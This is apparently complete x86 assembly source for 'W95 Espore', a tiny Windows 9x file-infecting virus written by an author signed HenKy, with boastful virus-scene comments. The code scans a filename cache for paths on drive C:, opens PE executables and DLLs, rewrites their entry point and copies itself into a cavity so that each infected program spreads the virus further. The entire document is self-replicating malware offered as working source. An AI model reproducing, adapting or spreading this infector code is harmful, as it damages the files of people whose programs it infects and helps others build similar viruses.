;----------------------------  W95 ESPORE BY HenKy -----------------------------
;
;-AUTHOR:        HenKy
;
;-MAIL:          HenKy_@latinmail.com
; 
;-ORIGIN:        SPAIN
; 

 ; WOW!!!!   140 BYTES !!!! AND 100% RING 3 !!!! (ONLY WINDOZE 9X CAN SUPPORT IT)

 ; OF COURSE MIDFILE AND NO GROWING CAVITY TECH

 ; IT SEARCHS FILENAMES INTO CACHE (AND PARASITE THEM) :-)     


 ; THE 0C1000000H ADDRESS IS USED AS BUFFER BECOZ WE HAVE WRITE/READ
 
 ; PRIVILEGES

 ; THE BFF712B9h ADDRESS IS THE CALL VINT21 

 ; THE INITIAL EDX VALUE POINTS TO A 28KB CACHE BUFFER WICH CONTAINS SEVERAL
 
 ; FILENAMES WITH COMPLETE PATH (ONLY PE EXE/DLL )

.386P
.MODEL FLAT
LOCALS

EXTRN    ExitProcess:PROC
MIX_SIZ  EQU  (FILE_END - MEGAMIX)

MACROSIZE   MACRO		            
            DB      MIX_SIZ/00100 mod 10 + "0"
            DB      MIX_SIZ/00010 mod 10 + "0"
            DB      MIX_SIZ/00001 mod 10 + "0"
            ENDM    
.DATA
        DB 'BIEN PEKE?O BIEN... LIKE AN ESPORE... HEHEHE',0  
        DB ' W9X ESPORE SIZE = ' 
        MACROSIZE                

.CODE

MEGAMIX: ; EDX: BUFFER
         ; EAX: EIP
         ; ECX: BUFFER
     
VINT21:             
        DD 0BFF712B9h   ; MOV ECX,048BFF71H  ;-) Z0MBiE
        DB 'H'          ; HenKy ;P
        XCHG EDI, EAX   ; EDI: DELTA    
        MOV  ESI,0C1000000H  ; ESI: BUFFER
        MOV  EBP,EDI    ; NOW: EBP=EDI=DELTA=INT21H

        ;EDX: POINTER TO FNAME
        
        MOV ECX,28500 ; LIMIT
PORK:
        INC EDX
        CMP WORD PTR [EDX],':C'
        JE KAA
        LOOP PORK
OK:
        PUSH 00401000H
        OLD_EIP EQU $-4
WARNING:
        RET   
KAA:
        MOV AX, 3D02h                       
        CALL [EDI]                       
        XCHG EBX, EAX               
        PUSHAD    ; SAVE ECX,EBX,EDX,EBP,EDI
        CALL PHECT                  
        POPAD
        MOV AH, 3Eh                  
        CALL [EDI]                           
        JMP PORK
                                           
PHECT:
                               
        XOR ECX,ECX
        MOV EDX, ESI                 
        MOV AH, 3Fh                   
        CALL R_W
        MOV ECX, [ESI+3Ch]             
        LEA EAX, [ESI+ECX]            
        CMP BYTE PTR [EAX], "P"        
        JNE WARNING                
        MOV ECX,[EAX+28H]
        CMP ECX, 1024   
        JB WARNING  
        PUSH EBP
        ADD ECX,[EAX+34H]
        MOV [EBP+OLD_EIP-MEGAMIX],ECX
        MOV EDI,EAX
        
PORRO:
        INC EDI
        CMP BYTE PTR [EDI],'B' ; hehehehe
        JNE PORRO
        INC EDI
        SUB EDI,ESI
        MOV EDX,EDI
        XCHG DWORD PTR [EAX+28h], EDI 
        LEA EDI, [ESI+EDX]             
        PUSH MIX_SIZ/4  
        POP ECX                                    
        POP EAX                        
        PUSH EAX
        XCHG ESI,EAX                                                     
        REP MOVSD                                        
        POP EDI                        
        MOV EDX, EAX                                                       
W:
        MOV AH, 40h                    
R_W:      
        PUSHAD                         
        XOR EAX,EAX                   
        MOV AH, 42h                     
        CDQ                            
        CALL [EDI]                        
        POPAD                           
        MOV CH, 4h                                                    
        CALL [EDI]
        RET

ALIGN 4
FILE_END:

        PUSH 0
        CALL ExitProcess

END MEGAMIX

